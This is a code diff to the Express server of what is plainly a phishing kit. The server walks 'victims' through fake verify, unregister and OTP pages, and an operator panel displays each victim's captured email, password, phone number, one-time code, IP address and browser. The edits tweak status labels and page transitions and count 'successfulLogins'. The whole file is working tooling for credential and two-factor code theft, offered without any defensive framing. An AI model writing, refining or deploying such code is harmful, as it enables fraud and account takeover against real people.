@@ -96,7 +96,7 @@ function getSessionHeader(v) {
   } else if (v.page === 'verify.html') {
     return v.phone ? `✅ Received phone` : `⏳ Awaiting phone`;
   } else if (v.page === 'unregister.html') {
-    return v.unregisterClicked ? `✅ Victim clicked unregister` : `⏳ Awaiting unregister`;
+    return v.unregisterClicked ? `✅ Victim unregistered` : `⏳ Awaiting unregister`;
   } else if (v.page === 'otp.html') {
     if (v.otp && v.otp.length > 0) return `✅ Received OTP`;
     return `🔑 Awaiting OTP...`;
@@ -129,7 +129,7 @@ app.post('/api/session', async (req, res) => {
     const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
     const ua  = req.headers['user-agent'] || 'n/a';
     const now = new Date();
-    const dateStr = now.toLocaleString();
+    const dateStr = now.toLocaleString(); // ISO or local – panel converts to local tz
 
     victimCounter++;
     const victim = {
@@ -187,7 +187,6 @@ app.post('/api/verify', async (req, res) => {
     const v = sessionsMap.get(sid);
     v.phone = phone;
     v.status = 'wait';
-    // DO NOT set page here – victim still on verify.html until they click unregister
     sessionActivity.set(sid, Date.now());
     const entry = auditLog.find(e => e.sid === sid);
     if (entry) entry.phone = phone;
@@ -204,11 +203,7 @@ app.post('/api/unregister', async (req, res) => {
     const { sid } = req.body;
     if (!sessionsMap.has(sid)) return res.sendStatus(404);
     const v = sessionsMap.get(sid);
-
-    // mark clicked **now** and move to unregister step
-    v.unregisterClicked = true;
-    v.page   = 'unregister.html';
-    v.status = 'wait';
+    v.unregisterClicked = true; v.status = 'wait';
     sessionActivity.set(sid, Date.now());
     res.sendStatus(200);
   } catch (err) {
@@ -270,11 +265,10 @@ app.get('/api/panel', (req, res) => {
   const list = Array.from(sessionsMap.values()).map(v => ({
     sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
     email: v.email, password: v.password, phone: v.phone, otp: v.otp,
-    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
-    unregisterClicked: v.unregisterClicked
+    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr
   }));
   res.json({
-    domain: currentDomain,
+    domain: currentDomain,               // always fresh
     totalVictims: victimCounter,
     active: list.length,
     waiting: list.filter(x => x.status === 'wait').length,
@@ -304,7 +298,7 @@ app.post('/api/panel', async (req, res) => {
       v.status = 'ok';
       if (v.page === 'index.html') v.page = 'verify.html';
       else if (v.page === 'verify.html') v.page = 'unregister.html';
-      else if (v.page === 'unregister.html') { v.page = 'otp.html'; }   // ← to OTP
+      else if (v.page === 'unregister.html') v.page = 'otp.html';
       else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
       break;
     case 'delete':
@@ -317,5 +311,6 @@ app.post('/api/panel', async (req, res) => {
 /* ----------  START  ---------- */
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
+  /* final fallback – overwritten on first request anyway */
   currentDomain = process.env.RAILWAY_STATIC_URL || process.env.RENDER_EXTERNAL_URL || `http://localhost:${PORT}`;
 });
